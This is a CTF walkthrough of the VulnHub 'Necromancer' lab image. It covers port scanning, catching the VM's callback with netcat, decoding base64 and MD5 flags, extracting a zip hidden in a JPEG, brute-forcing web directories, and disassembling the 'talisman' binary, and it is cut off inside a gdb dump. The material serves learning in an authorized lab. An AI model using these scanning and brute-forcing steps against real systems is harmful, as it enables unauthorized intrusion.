---
title: Necromancer
date: 2017-12-17 17:53:11
tags: CTF-Writeups
---

The Necromancer CTF (available at [vulnhub](https://www.vulnhub.com/entry/the-necromancer-1,154/)) sends you on a journey to defeat the Necromancer that inhabits the OpenBSD based image. The fact that the flags kind of resembles an overarching story is a really nice touch on otherwise technically interresting but dry CTFs.

{% asset_img "logo.jpeg" "Necromancer Logo" %}

*__Warning:__ From here on there will obviously be nothing but spoilers if you want to try the CTF yourself.*

---
### First Steps: Entering the realm of the Necromancer
First, the Necromancer's residence is to be found. A quick `netdiscover -r 10.0.2.5/24` reveals a suspicious presence at `10.0.2.10`:
```
 Currently scanning: Finished!   |   Screen View: Unique Hosts

 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 10.0.2.1        52:54:00:12:35:00      1      60  Unknown vendor
 10.0.2.2        52:54:00:12:35:00      1      60  Unknown vendor
 10.0.2.3        08:00:27:99:bb:18      1      60  PCS Systemtechnik GmbH
 10.0.2.10       08:00:27:de:4e:19      1      60  PCS Systemtechnik GmbH
```

We shall therefore investigate with `nmap -sTV 10.0.2.10` to see if any common TCP ports are open. All 1000 scanned ports are filtered. Just to be sure that there are no uncommon open TCP ports I run  `nmap -sTV -p- 10.0.2.10` which scans all ports and reveals that they are all filtered. Maybe UDP is the protocol of choice, so the next try is `nmap -sU -p- 10.0.2.10`:
```
Nmap scan report for 10.0.2.10
Host is up (0.00055s latency).
Not shown: 65534 open|filtered ports
PORT    STATE SERVICE
666/udp open  doom
MAC Address: 08:00:27:DE:4E:19 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 124.04 seconds

```
So port 666 is an open UDP port that runs the service *doom*? Interesting :godmode: ...


Let's see if we can communicate via `netcat -u 10.0.2.10 666`. The connection opens but nothing a appears. Hesitatingly, I type "*hello?*"; from the darkness a  voice resounds: "*You gasp for air! Time is running out!*". What's that supposed to mean? I decide to try a few things (actually I tried a lot more, all with the same result):
```
>hello?
You gasp for air! Time is running out!
>time
You gasp for air! Time is running out!
>breath
You gasp for air! Time is running out!
>IDDQD
You gasp for air! Time is running out!
```
I had to try the last one, given that the service is called *doom*. Countless different attemps all fail to lure out any other response, although it seems to be possible to crash the service which does not help either. We hit a brick wall...


### 1st Flag: If I can't get to you, you shall come to me

In hindsight the next step makes a lot of sense, but the CTFs I did before were all based around the idea that there is always some vulnerable service on some port. Since the only service in this case is *doom* on 666 I spent way to much time trying to exploit it. I do not want to make this writeup feel like I instantly switched to the following approach. In fact, I quit trying for that day but kept thinking about it. At some point I had the idea to watch the Necromancer's activity with Wireshark:

{% asset_img "wireshark.png" "Wireshark Log" %}

There it is! The Necromances want's to talk with us. Every minute a TCP SYN packet is sent to port 4444 of our machine. I had not anticipated something like that, because usually CTFs are based around (pseudo) realistic scenarios where this would not be likely to happen.

But enough talk, let's here what he has to say:

```
root@kali:~# netcat -l -p 4444
...V2VsY29tZSENCg0KWW91IGZpbmQgeW91cnNlbGYgc3RhcmluZyB0b3dhcmRzIHRoZSBob3Jpem9uLCB3aXRoIG5vdGhpbmcgYnV0IHNpbGVuY2Ugc3Vycm91bmRpbmcgeW91Lg0KWW91IGxvb2sgZWFzdCwgdGhlbiBzb3V0aCwgdGhlbiB3ZXN0LCBhbGwgeW91IGNhbiBzZWUgaXMgYSBncmVhdCB3YXN0ZWxhbmQgb2Ygbm90aGluZ25lc3MuDQoNClR1cm5pbmcgdG8geW91ciBub3J0aCB5b3Ugbm90aWNlIGEgc21hbGwgZmxpY2tlciBvZiBsaWdodCBpbiB0aGUgZGlzdGFuY2UuDQpZb3Ugd2FsayBub3J0aCB0b3dhcmRzIHRoZSBmbGlja2VyIG9mIGxpZ2h0LCBvbmx5IHRvIGJlIHN0b3BwZWQgYnkgc29tZSB0eXBlIG9mIGludmlzaWJsZSBiYXJyaWVyLiAgDQoNClRoZSBhaXIgYXJvdW5kIHlvdSBiZWdpbnMgdG8gZ2V0IHRoaWNrZXIsIGFuZCB5b3VyIGhlYXJ0IGJlZ2lucyB0byBiZWF0IGFnYWluc3QgeW91ciBjaGVzdC4gDQpZb3UgdHVybiB0byB5b3VyIGxlZnQuLiB0aGVuIHRvIHlvdXIgcmlnaHQhICBZb3UgYXJlIHRyYXBwZWQhDQoNCllvdSBmdW1ibGUgdGhyb3VnaCB5b3VyIHBvY2tldHMuLiBub3RoaW5nISAgDQpZb3UgbG9vayBkb3duIGFuZCBzZWUgeW91IGFyZSBzdGFuZGluZyBpbiBzYW5kLiAgDQpEcm9wcGluZyB0byB5b3VyIGtuZWVzIHlvdSBiZWdpbiB0byBkaWcgZnJhbnRpY2FsbHkuDQoNCkFzIHlvdSBkaWcgeW91IG5vdGljZSB0aGUgYmFycmllciBleHRlbmRzIHVuZGVyZ3JvdW5kISAgDQpGcmFudGljYWxseSB5b3Uga2VlcCBkaWdnaW5nIGFuZCBkaWdnaW5nIHVudGlsIHlvdXIgbmFpbHMgc3VkZGVubHkgY2F0Y2ggb24gYW4gb2JqZWN0Lg0KDQpZb3UgZGlnIGZ1cnRoZXIgYW5kIGRpc2NvdmVyIGEgc21hbGwgd29vZGVuIGJveC4gIA0KZmxhZzF7ZTYwNzhiOWIxYWFjOTE1ZDExYjlmZDU5NzkxMDMwYmZ9IGlzIGVuZ3JhdmVkIG9uIHRoZSBsaWQuDQoNCllvdSBvcGVuIHRoZSBib3gsIGFuZCBmaW5kIGEgcGFyY2htZW50IHdpdGggdGhlIGZvbGxvd2luZyB3cml0dGVuIG9uIGl0LiAiQ2hhbnQgdGhlIHN0cmluZyBvZiBmbGFnMSAtIHU2NjYi...

```

That looks encrypted. Let's try the usual suspects (after we get rid of the "..."):

```
root@kali:~# netcat -l -p 4444 > answer
root@kali:~# vim answer
root@kali:~# cat answer | base64 -d
Welcome!

You find yourself staring towards the horizon, with nothing but silence surrounding you.
You look east, then south, then west, all you can see is a great wasteland of nothingness.

Turning to your north you notice a small flicker of light in the distance.
You walk north towards the flicker of light, only to be stopped by some type of invisible barrier.

The air around you begins to get thicker, and your heart begins to beat against your chest.
You turn to your left.. then to your right!  You are trapped!

You fumble through your pockets.. nothing!
You look down and see you are standing in sand.
Dropping to your knees you begin to dig frantically.

As you dig you notice the barrier extends underground!
Frantically you keep digging and digging until your nails suddenly catch on an object.

You dig further and discover a small wooden box.
flag1{e6078b9b1aac915d11b9fd59791030bf} is engraved on the lid.

You open the box, and find a parchment with the following written on it. "Chant the string of flag1 - u666"
```

We have our first flag `e6078b9b1aac915d11b9fd59791030bf` and it seems like our story has just begun.

### 2nd Flag: We meet again

After we previously had no luck with our progress, the last lead seems to shine some light on the situation as `u666` obviously stands for the port behind which the doom service sends cryptic messages.

```
root@kali:~# nc -u 10.0.2.10 666
flag1{e6078b9b1aac915d11b9fd59791030bf}
Chant is too long! You gasp for air!
e6078b9b1aac915d11b9fd59791030bf
Chant had no affect! Try in a different tongue!
```

At least some response. We are on the right track, but what might the required tongue mean? In what 'tongue' is our flag even? We can rule out base64 as attempting to decode produces `{�;��[զ��^]�V�}�}��t�F�`. The next idea would be some kind of hash. We can make some educated guesses here, based on the fact that the flag is 32 characters long:

* SHA-0/1/2: SHA-0/1 would produce a 160-bit digest, resulting in `160/4=40` characters. SHA-2 would therefore produce even longer digests.
* SHA-3: Since the SHA-3 digest size is arbitrary so it could possibly represent the flag.
* MD5: This hash algorithm produces a 128-bit hash which corresponds to a 32 characters which matches our flag.

Due to the exact match I first assume that it is a MD5 hash. The next step is to translate the hash. MD5 is not reversible but it is not designed to resist cracking attempts, so we can give it a try. A quick search leads to [crackstation](https://crackstation.net/) which is able to reverse the hash instantly to `opensesame`. Before trying out to re-hash it with another algorithm I try it out unhashed:

```
root@kali:~# nc -u 10.0.2.10 666
opensesame


A loud crack of thunder sounds as you are knocked to your feet!

Dazed, you start to feel fresh air entering your lungs.

You are free!

In front of you written in the sand are the words:

flag2{c39cd4df8f2e35d20d92c2e44de5f7c6}

As you stand to your feet you notice that you can no longer see the flicker of light in the distance.

You turn frantically looking in all directions until suddenly, a murder of crows appear on the horizon.

As they get closer you can see one of the crows is grasping on to an object. As the sun hits the object, shards of light beam from its surface.

The birds get closer, and closer, and closer.

Staring up at the crows you can see they are in a formation.

Squinting your eyes from the light coming from the object, you can see the formation looks like the numeral 80.

As quickly as the birds appeared, they have left you once again.... alone... tortured by the deafening sound of silence.

666 is closed.
```

Nice, no need to try out all the other possible hash functions. On to the next flag...


### 3rd Flag: The first encounter at the chasm

The crows show us the way, so we saddle our webbrowser and follow. The 80 formed by the crows is a reference to the port through which unencrypted http traffic flows.

{% asset_img "chasm.png" "The Chasm" %}


```
Hours have passed since you first started to follow the crows.
Silence continues to engulf you as you treck towards a mountain range on the horizon.
More times passes and you are now standing in front of a great chasm.
Across the chasm you can see a necromancer standing in the mouth of a cave, staring skyward at the circling crows.
As you step closer to the chasm, a rock dislodges from beneath your feet and falls into the dark depths.
The necromancer looks towards you with hollow eyes which can only be described as death.
He smirks in your direction, and suddenly a bright light momentarily blinds you.
The silence is broken by a blood curdling screech of a thousand birds, followed by the necromancers laughs fading as he decends into the cave!
The crows break their formation, some flying aimlessly in the air; others now motionless upon the ground.
The cave is now protected by a gaseous blue haze, and an organised pile of feathers lay before you.
```

We have just met the Necromancer, let the hunt begin. The only lead we have is the image on the page. Let's download and analyze it:

```
root@kali:~/ctf/necromancer# ls
pileoffeathers.jpg
root@kali:~/ctf/necromancer# file pileoffeathers.jpg
pileoffeathers.jpg: JPEG image data, Exif standard: [TIFF image data, little-endian, direntries=0], baseline, precision 8, 640x290, frames 3
root@kali:~/ctf/necromancer# exiftool pileoffeathers.jpg
ExifTool Version Number         : 10.67
File Name                       : pileoffeathers.jpg
Directory                       : .
File Size                       : 36 kB
File Modification Date/Time     : 2017:12:17 19:41:05+01:00
File Access Date/Time           : 2017:12:17 19:41:05+01:00
File Inode Change Date/Time     : 2017:12:17 19:41:05+01:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Little-endian (Intel, II)
Quality                         : 60%
XMP Toolkit                     : Adobe XMP Core 5.0-c060 61.134777, 2010/02/12-17:32:00
Creator Tool                    : Adobe Photoshop CS5 Windows
Instance ID                     : xmp.iid:9678990A5A7D11E293DFC864BA726A9F
Document ID                     : xmp.did:9678990B5A7D11E293DFC864BA726A9F
Derived From Instance ID        : xmp.iid:967899085A7D11E293DFC864BA726A9F
Derived From Document ID        : xmp.did:967899095A7D11E293DFC864BA726A9F
DCT Encode Version              : 100
APP14 Flags 0                   : [14], Encoded with Blend=1 downsampling
APP14 Flags 1                   : (none)
Color Transform                 : YCbCr
Image Width                     : 640
Image Height                    : 290
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 640x290
Megapixels                      : 0.186

```

Nothing out of the ordinary. Maybe the image contains some steganography.

```
root@kali:~/ctf/necromancer# steghide info pileoffeathers.jpg
"pileoffeathers.jpg":
  format: jpeg
  capacity: 2.0 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase:
steghide: could not extract any data with that passphrase!
```

No luck, I tried a few passphrases like "Necromancer", "necromancer", the number of crows (all black-white combinations as numbers and written out), the number of feathers, and a few variations of the last flag. This seems to be a dead end, but we don't give up just yet:

```
root@kali:~/ctf/necromancer# du -sh pileoffeathers.jpg
40K	pileoffeathers.jpg
root@kali:~/ctf/necromancer# binwalk pileoffeathers.jpg

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, EXIF standard
12            0xC             TIFF image data, little-endian offset of first image directory: 8
270           0x10E           Unix path: /www.w3.org/1999/02/22-rdf-syntax-ns#"> <rdf:Description rdf:about="" xmlns:xmp="http://ns.adobe.com/xap/1.0/" xmlns:xmpMM="http...">
36994         0x9082          Zip archive data, at least v2.0 to extract, compressed size: 121, uncompressed size: 125, name: feathers.txt
37267         0x9193          End of Zip archive
```

Binwalk reveals that we do not just have an image at hand: The file also contains a zip archive.

```
root@kali:~/ctf/necromancer# mv pileoffeathers.jpg pileoffeathers.zip
root@kali:~/ctf/necromancer# unzip pileoffeathers.zip
Archive:  pileoffeathers.zip
warning [pileoffeathers.zip]:  36994 extra bytes at beginning or within zipfile
  (attempting to process anyway)
  inflating: feathers.txt
root@kali:~/ctf/necromancer# ls
feathers.txt  pileoffeathers.zip
root@kali:~/ctf/necromancer# cat feathers.txt
ZmxhZzN7OWFkM2Y2MmRiN2I5MWMyOGI2ODEzNzAwMDM5NDYzOWZ9IC0gQ3Jvc3MgdGhlIGNoYXNtIGF0IC9hbWFnaWNicmlkZ2VhcHBlYXJzYXR0aGVjaGFzbQ==
root@kali:~/ctf/necromancer# cat feathers.txt | base64 -d
flag3{9ad3f62db7b91c28b68137000394639f} - Cross the chasm at /amagicbridgeappearsatthechasm
```

And on goes the journey...

### 4th Flag: Journey from the highest webs to the lowest binaries

{% asset_img "cave.png" "The Cave" %}

```
You cautiously make your way across chasm.
You are standing on a snow covered plateau, surrounded by shear cliffs of ice and stone.
The cave before you is protected by some sort of spell cast by the necromancer.
You reach out to touch the gaseous blue haze, and can feel life being drawn from your soul the closer you get.
Hastily you take a few steps back away from the cave entrance.
There must be a magical item that could protect you from the necromancer's spell.
```

Again our only lead is the image on the page, so we try the same again:

```
root@kali:~/ctf/necromancer# ls
magicbook.jpg
root@kali:~/ctf/necromancer# file magicbook.jpg
magicbook.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 600x450, frames 3
root@kali:~/ctf/necromancer# du -sh magicbook.jpg
156K	magicbook.jpg
root@kali:~/ctf/necromancer# exiftool magicbook.jpg
ExifTool Version Number         : 10.67
File Name                       : magicbook.jpg
Directory                       : .
File Size                       : 154 kB
File Modification Date/Time     : 2017:12:17 19:37:48+01:00
File Access Date/Time           : 2017:12:17 19:38:01+01:00
File Inode Change Date/Time     : 2017:12:17 19:37:49+01:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 600
Image Height                    : 450
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 600x450
Megapixels                      : 0.270
root@kali:~/ctf/necromancer# binwalk magicbook.jpg

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
root@kali:~/ctf/necromancer# steghide info magicbook.jpg
"magicbook.jpg":
  format: jpeg
  capacity: 8.9 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase:
steghide: could not extract any data with that passphrase!
```

No luck this time and the journey takes an involuntary break for a few days. Well rested we give it another try, knowing we might have to think out of the box. If the next flag is another web page, we might be able to crack is using dirbuster, although looking at the last directory we probably won't get very far with the common wordlists. The text suggests that we need a magical item. A bit of research points me to CeWL which can generate custom wordlists from for example wikipedia. The closest thing wikipedia can provide is a list of mythological objects.

```
root@kali:~/ctf/necromancer# man cewl
root@kali:~/ctf/necromancer# cewl https://en.wikipedia.org/wiki/List_of_mythological_objects -d 0 > wordlist.txt
root@kali:~/ctf/necromancer# dirb http://10.0.2.10/ wordlist.txt -w

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Sun Dec 17 20:06:17 2017
URL_BASE: http://10.0.2.10/
WORDLIST_FILES: wordlist.txt
OPTION: Not Stopping on warning messages

-----------------

GENERATED WORDS: 6151

---- Scanning URL: http://10.0.2.10/ ----

-----------------
END_TIME: Sun Dec 17 20:06:22 2017
DOWNLOADED: 6151 - FOUND: 0

root@kali:~/ctf/necromancer# dirb http://10.0.2.10/amagicbridgeappearsatthechasm/ wordlist.txt -w

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Sun Dec 17 20:07:03 2017
URL_BASE: http://10.0.2.10/amagicbridgeappearsatthechasm/
WORDLIST_FILES: wordlist.txt
OPTION: Not Stopping on warning messages

-----------------

GENERATED WORDS: 6151

---- Scanning URL: http://10.0.2.10/amagicbridgeappearsatthechasm/ ----
+ http://10.0.2.10/amagicbridgeappearsatthechasm/talisman (CODE:200|SIZE:9676)

-----------------
END_TIME: Sun Dec 17 20:07:16 2017
DOWNLOADED: 6151 - FOUND: 1
```

It turns out that the magical item is a talisman and the corresponding directory is not at base level but rather behind `amagicbridgeappearsatthechasm`. The URL prompts a file download, which is then inspected:

```
root@kali:~/ctf/necromancer# file talisman
talisman: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=2b131df906087adf163f8cba1967b3d2766e639d, not stripped
root@kali:~/ctf/necromancer# chmod +x talisman
```

We identify the file as a x32 ELF executable. Depending on the system one might need the 32-bit version of libc to execute it.

```
root@kali:~/ctf/necromancer# ./talisman
You have found a talisman.

The talisman is cold to the touch, and has no words or symbols on it's surface.

Do you want to wear the talisman?  Yes

Nothing happens.
```

No matter what I input, nothing happens. With `gdb`, however, we are in control:

``` c-objdump
root@kali:~/ctf/necromancer# gdb ./talisman
GNU gdb (Debian 7.12-6+b1) 7.12.0.20161007-git
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./talisman...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
   0x08048a13 <+0>:	lea    ecx,[esp+0x4]
   0x08048a17 <+4>:	and    esp,0xfffffff0
   0x08048a1a <+7>:	push   DWORD PTR [ecx-0x4]
   0x08048a1d <+10>:	push   ebp
   0x08048a1e <+11>:	mov    ebp,esp
   0x08048a20 <+13>:	push   ecx
   0x08048a21 <+14>:	sub    esp,0x4
   0x08048a24 <+17>:	call   0x8048529 <wearTalisman>
   0x08048a29 <+22>:	mov    eax,0x0
   0x08048a2e <+27>:	add    esp,0x4
   0x08048a31 <+30>:	pop    ecx
   0x08048a32 <+31>:	pop    ebp
   0x08048a33 <+32>:	lea    esp,[ecx-0x4]
   0x08048a36 <+35>:	ret    
End of assembler dump.

(gdb) disassemble wearTalisman
Dump of assembler code for function wearTalisman:
   0x08048529 <+0>:	push   ebp
   0x0804852a <+1>:	mov    ebp,esp
   0x0804852c <+3>:	push   edi
   0x0804852d <+4>:	sub    esp,0x1b4
   0x08048533 <+10>:	lea    edx,[ebp-0x1ac]
   0x08048539 <+16>:	mov    eax,0x0
   0x0804853e <+21>:	mov    ecx,0x64
   0x08048543 <+26>:	mov    edi,edx
   0x08048545 <+28>:	rep stos DWORD PTR es:[edi],eax
   0x08048547 <+30>:	mov    BYTE PTR [ebp-0x1ac],0xec
   0x0804854e <+37>:	mov    BYTE PTR [ebp-0x1ab],0x9d
   0x08048555 <+44>:	mov    BYTE PTR [ebp-0x1aa],0x49
   0x0804855c <+51>:	mov    BYTE PTR [ebp-0x1a9],0x81
   0x08048563 <+58>:	mov    BYTE PTR [ebp-0x1a8],0xdd
   0x0804856a <+65>:	mov    BYTE PTR [ebp-0x1a7],0x93
   0x08048571 <+72>:	mov    BYTE PTR [ebp-0x1a6],0x4a
   0x08048578 <+79>:	mov    BYTE PTR [ebp-0x1a5],0xc4
   0x0804857f <+86>:	mov    BYTE PTR [ebp-0x1a4],0x95
   0x08048586 <+93>:	mov    BYTE PTR [ebp-0x1a3],0x94
   0x0804858d <+100>:	mov    BYTE PTR [ebp-0x1a2],0x53
   0x08048594 <+107>:	mov    BYTE PTR [ebp-0x1a1],0xd4
   0x0804859b <+114>:	mov    BYTE PTR [ebp-0x1a0],0xdb
   0x080485a2 <+121>:	mov    BYTE PTR [ebp-0x19f],0x96
   0x080485a9 <+128>:	mov    BYTE PTR [ebp-0x19e],0x1c
   0x080485b0 <+135>:	mov    BYTE PTR [ebp-0x19d],0xc0
   0x080485b7 <+142>:	mov    BYTE PTR [ebp-0x19c],0x95
   0x080485be <+149>:	mov    BYTE PTR [ebp-0x19b],0x86
   0x080485c5 <+156>:	mov    BYTE PTR [ebp-0x19a],0x5d
   0x080485cc <+163>:	mov    BYTE PTR [ebp-0x199],0xcd
   0x080485d3 <+170>:	mov    BYTE PTR [ebp-0x198],0xdc
   0x080485da <+177>:	mov    BYTE PTR [ebp-0x197],0x81
   0x080485e1 <+184>:	mov    BYTE PTR [ebp-0x196],0x51
   0x080485e8 <+191>:	mov    BYTE PTR [ebp-0x195],0xc0
   0x080485ef <+198>:	mov    BYTE PTR [ebp-0x194],0xdb
   0x080485f6 <+205>:	mov    BYTE PTR [ebp-0x193],0xdc
   0x080485fd <+212>:	mov    BYTE PTR [ebp-0x192],0x36
   0x08048604 <+219>:	mov    BYTE PTR [ebp-0x191],0xab
   0x0804860b <+226>:	mov    BYTE PTR [ebp-0x190],0xb5
   0x08048612 <+233>:	mov    BYTE PTR [ebp-0x148],0xe1
   0x08048619 <+240>:	mov    BYTE PTR [ebp-0x147],0x9a
   0x08048620 <+247>:	mov    BYTE PTR [ebp-0x146],0x59
   0x08048627 <+254>:	mov    BYTE PTR [ebp-0x145],0x81
   0x0804862e <+261>:	mov    BYTE PTR [ebp-0x144],0xc1
   0x08048635 <+268>:	mov    BYTE PTR [ebp-0x143],0x93
   0x0804863c <+275>:	mov    BYTE PTR [ebp-0x142],0x50
   0x08048643 <+282>:	mov    BYTE PTR [ebp-0x141],0xc8
   0x0804864a <+289>:	mov    BYTE PTR [ebp-0x140],0xc6
   0x08048651 <+296>:	mov    BYTE PTR [ebp-0x13f],0x9f
   0x08048658 <+303>:	mov    BYTE PTR [ebp-0x13e],0x5d
   0x0804865f <+310>:	mov    BYTE PTR [ebp-0x13d],0xcf
   0x08048666 <+317>:	mov    BYTE PTR [ebp-0x13c],0x95
   0x0804866d <+324>:	mov    BYTE PTR [ebp-0x13b],0x9b
   0x08048674 <+331>:	mov    BYTE PTR [ebp-0x13a],0x4f
   0x0804867b <+338>:	mov    BYTE PTR [ebp-0x139],0x81
   0x08048682 <+345>:	mov    BYTE PTR [ebp-0x138],0xd6
   0x08048689 <+352>:	mov    BYTE PTR [ebp-0x137],0x9d
   0x08048690 <+359>:	mov    BYTE PTR [ebp-0x136],0x50
   0x08048697 <+366>:	mov    BYTE PTR [ebp-0x135],0xc5
   0x0804869e <+373>:	mov    BYTE PTR [ebp-0x134],0x95
   0x080486a5 <+380>:	mov    BYTE PTR [ebp-0x133],0x86
   0x080486ac <+387>:	mov    BYTE PTR [ebp-0x132],0x53
   0x080486b3 <+394>:	mov    BYTE PTR [ebp-0x131],0x81
   0x080486ba <+401>:	mov    BYTE PTR [ebp-0x130],0xc1
   0x080486c1 <+408>:	mov    BYTE PTR [ebp-0x12f],0x9a
   0x080486c8 <+415>:	mov    BYTE PTR [ebp-0x12e],0x59
   0x080486cf <+422>:	mov    BYTE PTR [ebp-0x12d],0x81
   0x080486d6 <+429>:	mov    BYTE PTR [ebp-0x12c],0xc1
   0x080486dd <+436>:	mov    BYTE PTR [ebp-0x12b],0x9d
   0x080486e4 <+443>:	mov    BYTE PTR [ebp-0x12a],0x49
   0x080486eb <+450>:	mov    BYTE PTR [ebp-0x129],0xc2
   0x080486f2 <+457>:	mov    BYTE PTR [ebp-0x128],0xdd
   0x080486f9 <+464>:	mov    BYTE PTR [ebp-0x127],0xde
   0x08048700 <+471>:	mov    BYTE PTR [ebp-0x126],0x1c
   0x08048707 <+478>:	mov    BYTE PTR [ebp-0x125],0xc0
   0x0804870e <+485>:	mov    BYTE PTR [ebp-0x124],0xdb
   0x08048715 <+492>:	mov    BYTE PTR [ebp-0x123],0x96
   0x0804871c <+499>:	mov    BYTE PTR [ebp-0x122],0x1c
   0x08048723 <+506>:	mov    BYTE PTR [ebp-0x121],0xc9
   0x0804872a <+513>:	mov    BYTE PTR [ebp-0x120],0xd4
   0x08048731 <+520>:	mov    BYTE PTR [ebp-0x11f],0x81
   0x08048738 <+527>:	mov    BYTE PTR [ebp-0x11e],0x1c
   0x0804873f <+534>:	mov    BYTE PTR [ebp-0x11d],0xcf
   0x08048746 <+541>:	mov    BYTE PTR [ebp-0x11c],0xda
   0x0804874d <+548>:	mov    BYTE PTR [ebp-0x11b],0xd2
   0x08048754 <+555>:	mov    BYTE PTR [ebp-0x11a],0x4b
   0x0804875b <+562>:	mov    BYTE PTR [ebp-0x119],0xce
   0x08048762 <+569>:	mov    BYTE PTR [ebp-0x118],0xc7
   0x08048769 <+576>:	mov    BYTE PTR [ebp-0x117],0x96
   0x08048770 <+583>:	mov    BYTE PTR [ebp-0x116],0x4f
   0x08048777 <+590>:	mov    BYTE PTR [ebp-0x115],0x81
   0x0804877e <+597>:	mov    BYTE PTR [ebp-0x114],0xda
   0x08048785 <+604>:	mov    BYTE PTR [ebp-0x113],0x80
   0x0804878c <+611>:	mov    BYTE PTR [ebp-0x112],0x1c
   0x08048793 <+618>:	mov    BYTE PTR [ebp-0x111],0xd2
   0x0804879a <+625>:	mov    BYTE PTR [ebp-0x110],0xcc
   0x080487a1 <+632>:	mov    BYTE PTR [ebp-0x10f],0x9f
   0x080487a8 <+639>:	mov    BYTE PTR [ebp-0x10e],0x5e
   0x080487af <+646>:	mov    BYTE PTR [ebp-0x10d],0xce
   0x080487b6 <+653>:	mov    BYTE PTR [ebp-0x10c],0xd9
   0x080487bd <+660>:	mov    BYTE PTR [ebp-0x10b],0x81
   0x080487c4 <+667>:	mov    BYTE PTR [ebp-0x10a],0x1c
   0x080487cb <+674>:	mov    BYTE PTR [ebp-0x109],0xce
   0x080487d2 <+681>:	mov    BYTE PTR [ebp-0x108],0xdb
   0x080487d9 <+688>:	mov    BYTE PTR [ebp-0x107],0xd2
   0x080487e0 <+695>:	mov    BYTE PTR [ebp-0x106],0x55
   0x080487e7 <+702>:	mov    BYTE PTR [ebp-0x105],0xd5
   0x080487ee <+709>:	mov    BYTE PTR [ebp-0x104],0x92
   0x080487f5 <+716>:	mov    BYTE PTR [ebp-0x103],0x81
   0x080487fc <+723>:	mov    BYTE PTR [ebp-0x102],0x1c
   0x08048803 <+730>:	mov    BYTE PTR [ebp-0x101],0xd2
   0x0804880a <+737>:	mov    BYTE PTR [ebp-0x100],0xc0
   0x08048811 <+744>:	mov    BYTE PTR [ebp-0xff],0x80
   0x08048818 <+751>:	mov    BYTE PTR [ebp-0xfe],0x5a
   0x0804881f <+758>:	mov    BYTE PTR [ebp-0xfd],0xc0
   0x08048826 <+765>:	mov    BYTE PTR [ebp-0xfc],0xd6
   0x0804882d <+772>:	mov    BYTE PTR [ebp-0xfb],0x97
   0x08048834 <+779>:	mov    BYTE PTR [ebp-0xfa],0x12
   0x0804883b <+786>:	mov    BYTE PTR [ebp-0xf9],0xab
   0x08048842 <+793>:	mov    BYTE PTR [ebp-0xf8],0xbf
   0x08048849 <+800>:	mov    BYTE PTR [ebp-0xf7],0xf2
   0x08048850 <+807>:	mov    BYTE PTR [ebp-0xe4],0xf1
   0x08048857 <+814>:	mov    BYTE PTR [ebp-0xe3],0x9d
   0x0804885e <+821>:	mov    BYTE PTR [ebp-0xe2],0x1c
   0x08048865 <+828>:	mov    BYTE PTR [ebp-0xe1],0xd8
   0x0804886c <+835>:	mov    BYTE PTR [ebp-0xe0],0xda
   0x08048873 <+842>:	mov    BYTE PTR [ebp-0xdf],0x87
   0x0804887a <+849>:	mov    BYTE PTR [ebp-0xde],0x1c
   0x08048881 <+856>:	mov    BYTE PTR [ebp-0xdd],0xd6
   0x08048888 <+863>:	mov    BYTE PTR [ebp-0xdc],0xd4
   0x0804888f <+870>:	mov    BYTE PTR [ebp-0xdb],0x9c
   0x08048896 <+877>:	mov    BYTE PTR [ebp-0xda],0x48
   0x0804889d <+884>:	mov    BYTE PTR [ebp-0xd9],0x81
   0x080488a4 <+891>:	mov    BYTE PTR [ebp-0xd8],0xc1
   0x080488ab <+898>:	mov    BYTE PTR [ebp-0xd7],0x9d
   0x080488b2 <+905>:	mov    BYTE PTR [ebp-0xd6],0x1c
   0x080488b9 <+912>:	mov    BYTE PTR [ebp-0xd5],0xd6
   0x080488c0 <+919>:	mov    BYTE PTR [ebp-0xd4],0xd0
   0x080488c7 <+926>:	mov    BYTE PTR [ebp-0xd3],0x93
   0x080488ce <+933>:	mov    BYTE PTR [ebp-0xd2],0x4e
   0x080488d5 <+940>:	mov    BYTE PTR [ebp-0xd1],0x81
   0x080488dc <+947>:	mov    BYTE PTR [ebp-0xd0],0xc1
   0x080488e3 <+954>:	mov    BYTE PTR [ebp-0xcf],0x9a
   0x080488ea <+961>:	mov    BYTE PTR [ebp-0xce],0x59
   0x080488f1 <+968>:	mov    BYTE PTR [ebp-0xcd],0x81
   0x080488f8 <+975>:	mov    BYTE PTR [ebp-0xcc],0xc1
   0x080488ff <+982>:	mov    BYTE PTR [ebp-0xcb],0x93
   0x08048906 <+989>:	mov    BYTE PTR [ebp-0xca],0x50
